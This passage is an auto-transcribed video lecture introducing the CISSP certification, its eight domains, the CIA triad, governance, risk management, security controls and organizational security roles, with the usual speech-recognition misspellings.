our previous videos you would be aware
of the various cyber security
certifications like CCNA CompTIA
Security Plus cism cisc and CH to name a
few you might have also come across the
cssp certification let me tell you this
is one of the toughest and most in
demand certification in the cyber
security field in the current times
managing information security in a
company can be extremely challenging
with the Advent of the internet and
various other Technologies there is a
large exposure to various security
breaches the presence of Information
Security Experts in-house helps
organizations manage their I.T processes
in a better way this is where a cisp
professional is in demand by employers
compared to the other the Cyber Security
Professionals the demand for cssb
certified professionals has grown
rapidly there are nearly 50 000 job
postings for the same now that you have
an idea of the demand of cssp certified
professionals let's move on to
understanding what exactly cicsp stands
for certified information system
security professional it is considered
the gold standard in the field of
information security this certification
is taken up by it professionals it
trains a candidate to become an
information assurance professional
taking up the cisp certification will
help you define the design architecture
controls and management of Highly secure
business environments you will also be
called to cssp professional only after
you successfully pass the cssp exam so
now let's have a look into the cssp exam
requirements the primary requirement for
any candidate is that they should have
at least five years of work experience
in the field of information security in
addition to this it is also suggested
that the candidate clears other
certifications like like CCNA CompTIA
Security Plus ceh CSM and cic to name a
few cssp is considered as an advanced
level cyber security certification hence
it is better if the candidate clears the
basic level and the management level
certifications before moving to the cssp
certification as I mentioned earlier
this certification is suitable for
professionals who have a minimum of five
years of work experience professionals
working as Security Consultants and
managers Network and security Architects
I.T directors security Auditors and
chief information security officers can
take up the cssp certification let's now
move on to our next topic that is cisp
domains this entire certification is
grouped into a total of eight domains
the broad spectrum of topics included in
cssp ensure its relevance across all
disciplines in the field of information
security successful candidates are
competent in the following age domains
they are security and risk management
then we have asset security security
engineering coming Communications and
network security followed by identity
and access management then security
assessment and testing security
operations and finally we have software
development security these age domains
deal with different aspects of
information security we will have a look
into each of these individually and
understand what each of these domains
symbolize first up we have the security
and risk management domain as the name
suggests this domain mainly consists of
the fundamentals of security policies
compliance law and regulations
professional ethics risk management and
threat modeling cyber security and
information security plays a major role
in this domain there is a difference
between cyber security and information
security which is more often missed out
on by people cyber security refers to
several techniques used to protect the
Integrity of networks whereas
information security refers to processes
and tools deployed to protect sensitive
information to implement cyber security
we have a list of approaches like
compliance based ad hoc and risk-based
in compliance-based security measures
are decided based on regulations while
in ad hoc security measures are based on
no specific criteria in risk-based
security measures are based on unique
risks depending on the organization
let's now have a look at the CIA Triad
here C stands for confidentiality I for
integrity and a for availability
confidentiality integrity and
availability have served as the industry
standard for computer security since the
time of the first mainframes
confidentiality means that information
and functions can be accessed only by
authorized parties for example military
Secrets integrity means that information
and functions can be added altered or
removed only by authorized people and
availability means that systems
functions and data must be available on
demand now that we have understood the
CIA Triad let's have a look at the GRC
Trilogy this Trilogy is a structured
approach adopted by organizations to
align I.T objectives with business
objectives lives first up we have
governance such a program has motives
like ensuring goals are achieved
providing strategic plans and so on
governance is taken care of by the
senior Professionals of an organization
next up we have risk management here the
organization looks into mitigating all
types of risks such as investment
physical and cyber risks finally we have
compliance as discussed previously
compliance refers to abiding by the
defined laws and regulations so who do
you all think develops a security policy
which is used to achieve the
organization's goals well it is done by
the Senior Management of an organization
let's have a look at the characteristics
of these security policies first and
foremost these policies should support
the wishing and mission of the company
all the business units should be
integrated in these security policies
they should also be regularly updated
and finally it is important that these
security policies should be easy to
understand so that everyone can abide by
them without any problem in addition to
secure policies a risk analysis team is
also formed in organization to perform
the analysis of each known risk there
are various steps to perform risk
analysis let's have a look at each of
these first the team makes an assessment
of the value of the company's assets
then there is an analysis made based on
the risks to assets and finally the team
discovers solutions to mitigate these
risks now that was all about the first
domain of cssp security and risk
management let's have a look at the
second domain asset security asset
security deals with the collection and
protection of assets such as data and
devices here we will be looking into
Data classification data management data
remnants and data loss prevention so in
data classification the data owner
classifies data a data owner can be an
individual or a group of people who
created the information and are directly
responsible for it this classification
is done based on a set of predefined
criterias at the end the classification
is annually reviewed to see if there has
to be some change Incorporated data
management involves managing the
information lifecycle needs of an
Enterprise in an effective manner it
also ensures that the data complies to
the set standards and finally data
management also ensures data validity
and integrity moving on to data remnants
it is a term used for the residual of
digital data that is present even after
trying to erase the data data remnants
should be avoided as data should be
completely destroyed to tackle data
remnants we have methods like
overwriting and destruction to name a
few in overwriting other information is
written over the data several times so
that the original data cannot be
recovered in destruction data in the
storage device is physically damaged to
make recovery difficult asset security
also looks into Data loss prevention
here several measures and risk
assessments are performed to ensure that
information is only available to
authorized users let's now move on to
our third domain security engineering as
the name suggests this domain talks
about security architecture security
models cryptography and physical
security security architecture
establishes a common practice for
creating analyzing and using
architecture description within a
particular domain security architecture
takes the help of TCB that is trusted
Computing base security perimeter and
reference models to implement security
cryptography is also a part of security
Engineering in cryptography information
is secured by converting data from a
readable format to a non-readable format
and vice versa moving to a fourth domain
we have communications and network
security this domain is all about
Network structures transmission methods
and security measures used to achieve
CIA in an organization OSI model is the
foundation of networking this model that
is the open systems interconnection
model OSI model describes how data is
transferred from one computer to another
The OSI model consists of seven layers
starting from physical layer then data
link layer Network layer transport layer
session layer presentation layer and
finally application layer in the first
layer that is physical layer transmits
raw bit stream over the physical medium
then data link layer defines the format
of data on the network network layer
provides logical addressing and it also
provides path determination using local
addressing the fourth layer that is
transport layer provides end-to-end
Connections in this layer data is
transmitted using transmission protocols
including TCP and UDP the session layer
maintains connections and it is also
responsible for controlling ports and
sessions the sixth layer that is the
presentation layer ensures that data is
in a usable format and finally in the
seventh layer that is the in the
application layer human computer
interaction happens here applications
can access the network Services the
communications and network security
domain also talks about firewalls we can
define a firewall as a hardware or
software which is used to block the
incoming or outgoing traffic from the
internet to your a computer then we also
have the IDS IDs is known as the
intuition detection system this is
designed to detect unauthorized access
to a system IDs is used together with
the firewall and a router moving to
Identity and access management a fifth
domain let's have a look at what this
domain is all about this domain of cisp
is all about the access control
identification authorization and attacks
on access control and its
countermeasures to be able to access a
data set or a resource a subject has to
be identified authenticated and
authorized identity management Kerberos
and access criteria are few of the
crucial Fields here in identity
management through automated means users
are identified and authenticated this
domain also speaks of Kerberos and
Authentication Protocol that is based on
symmetric key cryptography and provides
end-to-end security access to data
shouldn't be granted to anyone and
everyone in fact it should be granted
based on the level of trust and the job
role in the organization it is also
better if it is provided based on the
location and the time let's now have a
look at our sixth domain security
assessment and testing so in this domain
we will look into audits security
control assessment and testing reports
as you might have heard of the term
audit it is nothing but a repeated
process wherein an independent
professional evaluates and analyzes
evidence then we have vulnerability
assessment wherein it risks are
identified and evaluated it helps in
identifying quantifying and prioritizing
vulnerabilities a well-planned and
executed assessment and test strategy
can provide valuable information about
risk and risk mitigation the assessment
and test is executed by a working group
called the integrated product team
testing is performed to check the data
flow between the application and the
system up next we have the security
operations domain the seventh domain of
CSP is all about investigations
monitoring and logging disaster recovery
and change management here we will look
into the fields of digital forensics
Incident Management and perimeter
security investigation of a computer
crime is also known as computer
forensics in digital forensics data is
examined to identify recover and analyze
opinions about digital information
Incident Management Works to restore the
services to normal as soon as possible a
team called the incident response team
is deployed to handle such emergencies
incidence response is defined as a
practice of detecting a problem
determining its costs minimizing the
damage resolving the problem and
documenting each step this team provides
management with sufficient information
and defends the company against future
attacks in Perimeter security there is
perimeter defense which allows us to
detect and keep a check on unauthorized
physical access this field also controls
the access to the facility moving on to
our eighth and final domain we have
software development security as the
name suggests this domain talks about
Security in a software development
lifecycle here we will be looking into
topics like API AI malware spyware
adware social engineering attacks and
SQL injection attack let's start off
with the application program interface
known as API API is basically a
collection of protocols and functions
used to create applications it supports
formats such as representational state
transfer rest and simple object access
protocol rest is nothing but using the
present features of the web in a simple
way and soap which is an acronym for
simple object access protocol is a
messaging protocol for exchanging data
among computers now let's move on to
malware as a security threat malware is
a term which refers to malicious
software viruses ransomware and worms we
can also call Trojan virus as a form of
malware which is capable of disguising
itself as a legitimate software malware
is basically a broad term that refers to
a variety of malicious programs one way
to protect your software from malware is
to always double check your downloads
moving on to our next security threats
spyware as the name suggests this is a
software that typically spies on your
system spyware is also a type of malware
which is used to secretly gather
information of the victim to give it to
a third party those programs that
secretly record all that you do on your
computer are called spyware it is always
advised to turn on pop-up blockers to
prevent spyware next up we have adware
adware is also known as advertising
supported software it is a type of
malware that constantly displays ads and
pop-ups some of such ads can also gather
your information at times adware is not
all that dangerous but it is a hassle as
it is a gateway to unwanted advertising
on the screen and it can also change the
browser homepage adverts are known to
display unwanted and annoying
advertisements on your screens let's now
have a look at Social Engineering
attacks it is basically the art of
manipulating people so that they end up
giving their confidential information
this attack lures victims into handing
over their confidential data this attack
takes place by tricking the human mind
the most common social engineering
attacks are fishing spear fishing and
Wheeling fishing attack phishing attack
is a practice wherein the hacker usually
sends fraudulent emails which appear to
be coming from a very trusted Source
this is done to install malware or to
steal sensitive data like credit card
information and various other login
credentials spear phishing attack is a
variation of phishing here the attacker
targets a specific individual or a group
of people and in wailing fishing attack
well the powerful and prominent
individuals are made targets moving on
to our next attack we have SQL injection
attack SQL injection attack is a type of
code injection attack in a database
driven website the hacker manipulates a
standard SQL query it allows attackers
to tamper with the existing data here
malicious code is inserted into the SQL
Server to obtain information so ncissp
as with every security course we start
off with the CIA Triad now here CIA is
confidentiality integrity and
availability so it starts off with every
security mechanism when we talk about
security and we want to keep things
secure what is it that we want to secure
it is the data of an organization that
is the most valuable asset to the
organization and that's what we want to
secure when we say that we want the data
to be secured we basically talk about
three aspects for that data the first
and the foremost that the data needs to
remain confidential the second aspect
that the traitor needs to be trustworthy
and the third concept that the data
should be available to all authorized
users when and where they require it so
going back to the first point when we
say we want data to be confidential what
do we mean by that by confidentiality we
talk about the data being made available
only to authorized users after you have
authenticated them insured or assured of
their authenticity and only then you're
going to give access to that data right
so even if you go into an organization
an organization has a hierarchy of
governance right so only certain people
with certain clearances or certain job
titles can have access to certain amount
of data whereas other people may not
have access to it for example a person
working in the sales department will not
have access to data that is accessed by
the HR department thus that's what we
are looking at classification of data
and keeping it confidential only making
it available to those people who require
it when we say trustworthiness or the
Integrity of that data the Integrity is
where where the data has been altered
modified removed deleted by unauthorized
people so we want to prevent that which
means when we say we want the Integrity
intact we want to ensure that only
authorized people can modify alter or
remove data if they are allowed to do so
so that's where the authorization and
authentication comes into the picture
again and data needs to be available for
me to safeguard data I can just lock it
up in a safe through the safe in the
depth of an ocean and say that the data
is secure because it cannot be leaked
out but that data is no longer available
to authorized users hence that data is
useless for me data would have value
when the data remains confidential has
its trustworthiness intact and is still
available to all the users that are
authorized to access it so when we talk
about security we want these three
aspects to be implemented on any and
every digital asset that the
organization has and does once these
three points are guaranteed or at least
assured to a certain extent we can then
say that the data or that particular
asset is secured moving on let's talk
about information security information
security is the process of protecting
data and information systems so in the
CIA as we talked about it when we said
what do we want to protect we want to
protect all the information assets or
the technical assets that we have from
any of the vulnerabilities that can be
identified so we want to restrict
unauthorized access and use we want to
restrict deletion accidental or
intentional if they have not been
authorized to do so modification of data
so the Integrity part and destruction of
Data Destruction could not only be
deleting data but it could be something
like a ransomware where the data gets
encrypted so it's still there it's just
not accessible to you now information
security ensures the implementation of
these following aspects the first and
foremost comes from information security
policies which is the governance aspect
of it the policies are designed to have
a implementation of security in an
organization that helps the business
processors to be executed in a secure
manner where are these policies coming
from they come from standards or
guidelines which are globally available
and based on which we can start
developing our security policies for
example if I want to develop a security
policy in my organization I might want
to depend on Frameworks like ISO 27001
cobit or something similar once I have
these standards set I would come back to
procedures procedures being how are
these standards to be executed right for
example in my policies I ensured that I
want encryption of AES 256 to be
implemented or rather in the policy I
determined that we want encryption to be
implemented on a data set based on the
classification of those data so in my
policies I will determine how the
classification is going to work how data
is going to be classified on what
parameters and thus once the data gets
classified we are going to come back to
standards where we say if it is
classified as a confidential data we
want to use encryption to protect that
data and we want AES 256 to be utilized
for encryption so how do we go about it
how do we implement the encryption
that's where your procedures come into
the picture your guidelines are
troubleshooting mechanisms optional
document so if somebody has trouble
following the procedures they might want
to go into the guidelines and see how to
troubleshoot the scenario that they are
facing baselines are basically the
minimum achievable Target that you want
to go with with these policies so let's
say when I say I want to have a baseline
on a server where for the server to be
published onto the internet or to be
used in production environment it has to
meet a certain criteria which means I
can go back to the hardware and I can
say the server needs a hardware
configuration of X Y and Z let's say a
processor a Xeon Processor with 16 cores
128 gigs of RAM so that's a baseline
that I need for a particular server for
it to be put in the production
environment for a particular use
anything above that is acceptable but
nothing should go below that then comes
the risk management while we are
implementing these policies procedures
we have those standards in place if we
Face any risk during that period or if
we Face any threat or a vulnerabilities
identified during this period all these
terms we are going to discuss in a
little bit so when we identify
vulnerabilities or threats that's where
our risks run into the picture the risk
management comes in saying okay this is
a risk that we have identified and now
how do we want to mitigate the risk then
the security organization comes into the
picture the day-to-day activity of how
Security is to be implemented and for
all of these procedures policies
Baseline standards to be implemented to
be ensured that there or to be assured
that they are working properly we need
to make our employees aware that these
policies exist this is something that
they need to follow thus the awareness
or the security education comes into the
picture here the security education is
more focused on helping employees adhere
to the company policies and standards
rather than educating employees about
security we don't want to make everybody
a ethical hacker we just want to ensure
them or we want to assure the
organization that everybody has been
warned about policies procedures
security requirements and they are going
to follow those requirements for example
a password policy where you have to
adhere to a specific password policy to
ensure passwords are created at the same
time there is another password policy
which is that you should not share
passwords with your colleagues no matter
what so for me for my employees to
follow that I need to make them aware
that these policies exist and there are
repercussions if they do not follow
these particular policies so coming back
to the governance part what is
governance since we have been talking
about it governance ensures that the
security strategies are aligned with
business objectives and consistent with
regulations so what does it guarantee
appropriate information security
activities are being performed based on
what based on the policies that we have
created based on the standards that we
have and the baselines that we would
have created so security has to be
comparable right so if I say I have
secured against particular attacks the
attacks have to be identified and then
compared to those particular attacks I
can say I have mitigated these
activities by having specific security
controls thus I can say that I am secure
the governance aspects keeps a watch on
all the security controls to see that
those security activities are insured
are being implemented and are performing
to the best of their abilities that's
where your governor comes into the
picture the risks being reduced so the
risk management also comes under the
governance where you are looking at
newly identified risks and you're then
implementing security controls that
would mitigate these risks then we are
looking at information security
Investments appropriately directed so
when I say I want a security control
which would be a firewall IDs IPS
antiviruses whatever is required it
needs to have a return on investment
which is acceptable for the organization
you don't want to spend up too much of
money in security thus creating losses
for the organization when you say a
business a business objective is always
to make money rather than lose money so
security should be a supporting feature
to the business objectives where the
services are being provided by the
business in a secure manner in such a
way that they can still have a positive
return on investment on the services
that are being provided and the
executive management can determine the
program's Effectiveness this is the
major part because we have to even in
any compliances audits technical audits
we have to prove that whatever we have
implemented actually works is effective
thus mitigating the risk if your
security controls are not effective then
you have just wasted a bucket load of
money and have not achieved any security
measures in your exercise moving on to
security controls security controls are
measures taken to safeguard and
information system from an attack
basically for the CIA Triad the
confidential and integrity and
availability so security controls could
be administrative controls technical
controls of physical security controls
what are administrative security
controls they would be policies
procedures that we have in place so the
password policy becomes an
administrative control where the
management has made everybody aware that
the password needs to meet a particular
complexity should not be shared and thus
becomes an administrative security
control a technical security control
would be where we are implementing this
policy and thus when I try to create a
password there is a software that Maps
the password to the complexity
requirements assures or ensures that the
complexity requirements have been met
and thus allows the password to be
accepted already takes the password as
the case may be that is a security
control a physical security control may
be let's say a CCTV camera which you are
going to use to monitor people and
ensure that nothing untoward happens
it's not only against physical crime but
let's say access to a particular room
where nobody is seen tailgating uh maybe
monitoring a server room which is very
well secured and ensuring that
unauthorized people do not get access or
purposefully or intently do not access
that area at all times so these are the
three levels of security controls that
can be implemented to enhance the
security of an organization then we come
to security policies policies is an
overall broad statement produced by a
Senior Management that dictates the role
of security within the organization for
example the password policy that we
talked about it just said that it needs
to meet a certain complexity which is a
broad statement that is being made by by
the management saying we want to adhere
to this policy to ensure that we do not
get hacked by Brute Force attacks or
dictionary attacks or whatever it is the
broad statement is trying to prevent
certain attacks from happening on the
organization how it is implemented
that's where the procedures and
everything else comes into the picture
it must integrate security into all
business processes so if I start
creating a policy which ensures that the
complexity should be so high that the
password should be at least 20
characters strong that would be
detrimental to the organization's health
because people may not remember those
passwords or resetting those passwords
or having technical mechanisms technical
security controls in place to implement
that kind of stringent security may be
too expensive to have so whatever
policies are created they need to be in
line with the business processes as well
the policy must be reviewed and modified
periodically or as company changes so as
and when the company becomes more mature
and can have more levels of security
they must look at their policies again
and redefine them or as a company grows
or changes Market scenarios or changes
business processes these policies may
become redundant so you want to look at
those policies and Implement newer
policies or modify the existing policies
to suit the business processes in a
better manner it must support vision and
mission of the organization a business
once established will always have a
long-term vision for example the
e-tailer example that we are talking
about for me to open a e-tailer key
retailing website I don't want it to be
periodic I don't want it to be for a
month or something like that I want to
achieve success in that factor and I
want to create a plan of where I want to
reach let's say in the next five years
so how do I achieve that that's
something that I need to plan as a
business plan all my security mechanisms
that are in place should be in alignment
with the business plans business Visions
across the number of years that we have
envisaged the business to perform so
that's where the policies come into the
picture policies are always long term
not short-term documents but need to be
periodically reviewed and modified as
the business grows or business changes
its Pusher then looking at compliance
compliance means confirming to a rule
such as a specification policy stand or
law so we have looked at compliance from
a perspective where we talked about ISO
27001 or PCI DSS or those Frameworks now
these are not laws but these are
standards of Frameworks that have been
created over a period of time through
experience and these are targeted
towards organizations towards specific
Industries for example PCI DSS is only
towards Finance organizations where they
have payment gateways in place the iso
27001 is a more generic policy which can
be implemented by various organizations
HIPAA health insurance portability and
accountability Act is an American act
that talks about uh Health rated data of
its citizens so these are compliances
these may not be laws but you need to
adhere to these to be effective and to
be allowed to conduct business in that
particular industry then we have code of
ethics code of ethics State safety of
the Commonwealth duty to our principles
and to each other requires that we
adhere and be seen to adhere to the
highest ethical standards of behavior
they for strict adherence to this code
is a condition of certification what are
the ethics protect Society the
Commonwealth and the infrastructure act
honorably honestly justly responsibly
responsibility and legally prove
diligent and competent service to the
principles advance and profession now
the code of ethics are codes created by
IC Square for the cisp professional and
you need to adhere to these codes if
they identify violation of these codes
from any member they would debug the
member strip them of the certification
and even Blacklist them to based on
whatever ethics they have violated so
even before the exam you have to go
through the code of ethics you have to
accept the code of ethics in the exam
you may get get up to five to six
questions just on Code of Ethics then
comes the legal systems uh that's where
the law comes into the picture lock
would differ from country to country or
from region to region and thus depending
on which country you are in you may need
to be aware of those laws of those
countries as far as cisp is concerned IC
square is concerned they are an American
organization so they would talk about
mostly American laws and a few European
laws or directives as well so there are
three different laws that we talk about
civil common and religious laws depends
on the country the culture of that
particular country the information
security professional should understand
the different legal systems followed
internationally so you also may come
across the classification as civil law
criminal law and law of torch civil law
is basically a law where let's say a
contract has been breached and it's not
criminal in nature you just want to sue
an organization for breach of contract
criminal law is where something criminal
has happened under the particular Act of
that particular country like let's say a
murder or an attack that has happened a
physical attack or something got stolen
and the third one was the law of
thoughts where it's more of a
compensatory law where you can file a
case a civil suit a demand compensation
in lieu of the wrongs that have happened
to that particular organization or that
individual then comes the personal
security the person the other people
inside the organization need access to
data to complete their assigned work and
hence out the potential to misuse these
Privileges and thus you should have
personal security as well now when we
talk about hiring practices for people
most of the organizations perform
background checks and we get confused
why these background checks are being
done the background checks are essential
to the health of the organization where
you are ensuring that the person is not
a malicious person has the prerequisite
certifications or the qualifications
have never been debarred or have never
been prosecuted do not have a criminal
background thus preventing physical
attacks on the organization for example
a competitor may attempt to place in
your organization a spy to spy to gather
information on the C secrets of that
organization and report it back to the
competitor a background check May reveal
that this person was previously employed
by a competitor and thus you might want
to verify that how that employment got
terminated when did it get terminated or
is this person misusing anything or
misrepresenting uh any aspect of his or
their life then you also need to get
confidentiality agreement signed with
them for example ndas non-disclosure
agreements data that is being shared
with them the ownership of that
particular data and what are the
repercussions if that confidentiality is
breached by that particular person
conflict of interest agreements for
positions handling competitive
information as you go higher up in the
organization you might come across
contracts where it prohibits a
particular person in engaging and act
into the same activity with a competitor
for a particular period of time so if
there is a conflict of interest when
you're hiring a person where they have
signed in such a agreement with another
competitor or another organization you
don't want to embroil yourself in a
lawsuit where the other organization May
sue you for hiring a person while they
were still under that particular
contract so it's not only to look at the
background of these people but to
safeguard the organization from any
lawsuits or any violations of contract
as well okay the non-complete agreements
for the positions in charge of unique
corporate processes that again goes on
to say if you're going to leave the
organization you cannot start up a
competing business similar to the
organization's business and so on so
forth now let's come back to the
technical aspect and start talking about
vulnerability threats and risk now what
is a vulnerability it is nothing but a
weakness in a system or a process
implies the absence of a countermeasure
vulnerability is internal and is more
easily managed so it's uh basically a
flaw or a misconfiguration or a design
flaw or uh something like using defaults
username passwords configurations where
if that particular flaw is misused it
will lead into a security event on that
particular device for that particular
organization station so when we say a
security event it has to be detrimental
in nature so if somebody is using a weak
password that can easily be cracked that
is a vulnerability where you have
identified a weak password and then you
want to prevent that vulnerability by
imposing a security control or a
countermeasure the security control here
starts off with the policy of having a
robust security policy where a password
policy comes in that describes the
complexity of a particular password and
then you talk about a technical
countermeasure where you have
implemented a identity and access
management plan which would ensure that
the person creating that password
adheres to the complexity of that
particular policy then a threat the
threat is the possibility that the
vulnerability might be exploited which
will result in loss so if somebody has
created a weak password and it has been
allowed that's a vulnerability which can
be exploited by the usage of Brute Force
attacks or dictionary based attached to
crack passwords if the password is
cracked somebody unauthorized may get
access to that data thus resulting in a
loss for that organization so that
threat is the possibility of that
particular vulnerability being exploited
and then comes the risk the risk is
basically the likelihood of that attack
being happening so I have a weak
password it can be exploited by a brute
for as a dictionary attack the
likelihood of that attack is what
determines the risk level for me now the
likelihood will always be hypothetical
but we don't want to run Helter Skelter
and we do not want to take uh the
possibility to extreme so that's where
your business processes come into the
picture your security policies come into
the picture based on the business
processes and the policies implemented
if I have a weak password what would be
the loss that I would face for that
particular person for example a fresher
coming into an organization having a
weak password but having limited access
to uh data would have a lesser risk
because of the loss being lesser than a
CEO of an organization using a weak
password and thus getting exploited
because the CEO will have access to more
proprietary data that if gets into the
competitor's hand would lead in huge
losses thus the same risk of having a
password cracked for refresher will have
lesser loss thus a lesser risk compared
to the same risk to a CEO where the loss
would be higher so a threat could also
be in multiple aspects threats could be
natural that means to a fires flooding
tornadoes anything that is an act of God
that can happen with minimal human
interaction or the second thread would
be man-made where man is responsible for
it like theft hacking writing War
anything that is created by a man or
rather humans and Technical in nature
could be software bugs where
vulnerabilities create are created or
server failures where something
technical has gone wrong and you need a
technical heirs skilled person to come
in and repair that particular aspect
then the fourth one would be a supply
system failure or a chain supply failure
where you have dependencies for example
any organization will have a dependency
on an electricity service provider where
they are providing electricity as a
service which powers on the I.T
infrastructure if the service broader
fails and there is electricity or a
power cut your systems are not going to
work thus you need a secondary mechanism
to prevent that threat from being
realized once we have identified these
threats we have identified these
vulnerabilities and we have identified
the likelihood and the probability of
that attack that's where we come across
the risk management exercise now what is
risk management risk management is a
hypothetical exercise where we have
identified a vulnerability we have
looked at the threat that it may have
and the likelihood of that thread being
realized once we have identified the
threat the risk level that's where the
risk management comes into the picture
reading from the slides a core component
of Enterprise security program why
because we need a baseline And We
compare security to a baseline for
example I've got a firewall that has
been configured in a particular manner
now when I do a vulnerability assessment
on the firewall it the vulnerability
assessment is a report that states that
some of the rules may now be redundant
thus allowing access to unauthorized
users this becomes a risk or this
becomes a threat if this threat is
identified by unauthorized people they
would then try to attack this firewall
to gain access to that data which they
are unauthorized to access thus leading
to losses for an organization what is
the likelihood of this happening if the
likelihood is high or low that's what
the risk management program is all about
right and based on these risks we
Implement security controls we manage
the security controls and then we verify
the security controls for future risks
to coming into the picture it must be
defined and it is always defined as an
ongoing project because risks will
always change based on the businesses
based on the security controls that you
have this will give a guidance to an
organization of how security is being
implemented how it has enhanced over a
period of time and how security mature
that organization has become because of
the risk assessment program it it also
helps you to satisfy two aspects due
diligence and new care what is due
diligence due diligence is basically the
research that organization does in
identifying those risks and mitigating
them the due care is the actual part of
mitigation where you have implemented a
security control to mitigate the risk
that you have identified so if companies
negligent that means if the company
doesn't have a risk management program
it is not going to be that security uh
oriented or the security is not going to
be that great thus the company may not
comply to laws regulations and standards
thus causing them penalties loss routes
and other reprications in the industry
based on whatever they are doing for
risk management we come to Frameworks
Frameworks are used to categorize
Information Systems so that we can
identify threats or risks based on the
classification so these classification
helps us determine the criticality and
the sensitivity of information system
right so what is the sensitivity and
criticality it basically gives us an
understanding of the value of the asset
that we have so if you go back to domain
one the asset value or the asset
identification asset security that's
where it comes into the picture
obviously a database server is going to
be more secure than a end user laptop
based on the data that they have thus
the criticality of the system for a
database is much higher than the end
user's laptop then we look at the
security controls that can be
implemented then for those the
Frameworks like ISO 27001 comes into the
picture there is copied there is there
are a lot of Frameworks out there Nest
800 iPhone 53 then we talk about
assessing the security controls once we
have placed those security controls we
need to verify those controls are placed
properly they actually mitigate the risk
and are appropriate to correctly
mitigate that particular risk that they
are creating then looking at authorizing
Information Systems Grant Information
Systems Operations based on risk
determined so you've identified address
you have authorizing some of them some
of the devices to function in a
particular manner based on which some of
those risks would be mitigated or would
be reduced to an acceptable level so in
the cissp we talk about a lot of risk
assessment strategies we look at how we
can manage risks the four different
types of managing risks would be one is
to mitigate other is to transfer the
third is to accept it and the fourth one
is to neglect the risk so uh in the cisp
it talks in great details about those
risk assessment strategies uh we're
talking about the four types of risk
mitigating strategies they are risk
avoiding or avoiding the risks accepting
the risk transferring the risk and
eliminating the risk so uh in the course
we basically talk about a lot of risk
strategies and how to mitigate these
risks and how they can be implemented to
bring down to a acceptable level so
again this caps acceptance risk appetite
of an organization comes into the
picture these terms are then discussed
uh in the training to understand how the
policies would work around the risk
management strategy moving on then
looking at monitoring security control
so once we have security controls in
place we have Assist them we also need
to monitor them for the effectiveness
and though they are going to create any
alerts or any risks are being realized
or any new risk that may be created by
the security control implementation so
in these risk assessment these are the
Frameworks these are the steps that we
want to follow to identify mitigate and
monitor these risks so the management
begins with risk assessment what do you
mean by risk assessment identifying the
impact of the risk that the risk could
have on the organization and there would
be two different ways to assess the risk
a quantitative assessment or a
qualitative assessment a quantitative
assessment is more quantifiable or is
numerical in in its process where you're
looking at assigning costs to particular
assets and the threats so the losses
that you may figure out in a risk
assessment strategy would be more
numerical where would be in a currency
format well let's say a risk if realize
would lead to a loss of a extra amount
of dollars that's where the quantitative
analysis comes into the picture the
qualitative analysis would be quality of
a service so if a service is being
affected because of a risk what is the
degradation of that service to what
aspect is is it getting degraded for
example internet that we use if there is
an internet outage or if there is a
rejection in internet speed right so if
I've got a 10 Mbps line and now because
of some fault of the ISP it gets reduced
to 4 Mbps I may not be able to conduct
the business that I would I was doing on
a 10 Mbps line thus the quality of that
device has degraded thus it is going
thus it is a risk and it is causing me
losses right so qualitative risk
analysis would be more descriptive in
nature rather than be numerical in
nature uh most of the companies or
organizations would follow a hybrid
policy because it is not possible to
have a quantitative quantitative risk
analysis in each and every scenario
newer organization which doesn't have
much data to rely on historical data to
a quantitative risk analysis or a hybrid
risk analysis whether using a
combination of quantitative and
quantitative both thus uh the risk
controls that we were talking about risk
acceptance risk reduction and risk
assignment uh there is risk avoidance as
well so there are four controls the risk
reduction is where you have implemented
a security control based on which the
risk has been reduced to a more
acceptable level risk assignment is
where you're also known as risk
avoidance that's where you're avoiding
Risk by Outsourcing it so talking about
risk controls again the four types being
accept avoid transfer and reduce risk
acceptance is where uh your the
organization is willingly accepting the
rest as the way it is because they don't
want to deal with it right now they may
deal it with it in the next iteration or
is it as an it is at an acceptable level
and the company just wants to move on
avoiding the risk is where you are going
to try to not use the service where the
risk exists does avoiding is where you
have identified a particular service
where the risk exists and now you're not
using the service to avoid the risk
altogether risk limitation or risk
reduction would be where you are
implementing a security control to
mitigate the risk and then risk
transference is where risk assignment
comes into the picture where you are
transferring it to a third party like
Outsourcing it by using Insurance to
limit the risk so for example the threat
is of a fire the risk is high but you
cannot do anything about it so you
purchase insurance so if the fire
actually happens you would still be
reimbursed for the losses that you have
faced coming back to counter measures we
have discussed administrative uh
countermeasures these are policies rules
regulations laws Customs that a company
needs to adhere to based on the industry
that they are in then there are
technical control software controls
anything that is technical in nature IDs
IPS firewalls encryption anything that
is going to help you implement the CIA
and then physical where you would look
at locks on doors security guards at
offenses where they're preventing access
to unauthorized people let's talk about
rules and responsibilities of management
now as far as management is concerned or
the hierarchy is concerned uh you can
see on the screen there's a Senior
Management the security professional
data owner custodian and user now these
are from exam perspective from the
certification perspective obviously the
hierarchy in an organization would be
slightly different but here the Senior
Management is the responsible party for
the entire security mechanism so they
must drive the entire security program
so CIS SSP talks about a top-down
approach where the Senior Management has
realized the importance of security and
is implementing at all levels within the
organization thus they are a part of it
and they are supporting the security
program they Define the tolerance of
risk of how much risk is stopping to be
tolerated by an organization from a
monetary perspective or the quality
perspective as well depending on the
laws legislations regulations
compliances and the contracts the
business has signed they would rely on
Security Professionals to manage the
risk but the exercise and the management
process has to be defined by the Senior
Management once the security team comes
up with the counter measures the Senior
Management either approves or
disapproves them based on the return on
investment of that countermeasure the
security professional assists with the
development of policy documents gives
their inputs because they are the people
who are in the day-to-day process of
dealing with these thus they can
identify gaps and give good inputs to
modify or to create the policy in a more
robust manner the Security Professionals
may be a part of the risk assessment and
risk management team as well especially
uh the security technical aspects of it
assist with the implementation and
maintenance of countermeasures so the
administrative technical or physical
measures that you have identified you
may be requested to implement that for
example the locks that we have on the
door the swipe locks they are connected
to a database where the database is
maintained so as a security professional
you wouldn't be responsible to fit those
locks but to create the database manage
and maintain the database where that
information is kept upon where people
are authorized and authenticated and
would be responsible for monitoring
auditing and security assessments as
well the data owner the owner of that
particular data part would normally be
the head of the department for example
the sales data is normally owned by the
director of sales of that department so
that they would be ultimately
responsible for identifying that data
classifying that data and accepting the
security controls that are implemented
they may request for additional security
controls if they deem fit the security
professional implements the security
controls then the custodian a person who
is responsible for implementing the
approved security controls or managing
the day-to-day activity of the security
controls for example the secure
professional has identified an access
control to be implemented on a data set
that the data owner owns the data owner
has approved of it it is the custodian
who is going to implement that strategy
or implement the control on it the user
is basically the user who or the person
who accesses the information and ID
resources does whatever access controls
have been implemented would identify the
user authenticate authorize them and
help them accountable for whatever they
are doing if the user is unable to
authenticate access would be denied we
will focus on the second domain of cisp
which is asset security so let's
understand the need for asset security
through a small scenario well it was yet
another regular day in Tim's
organization everything was going on
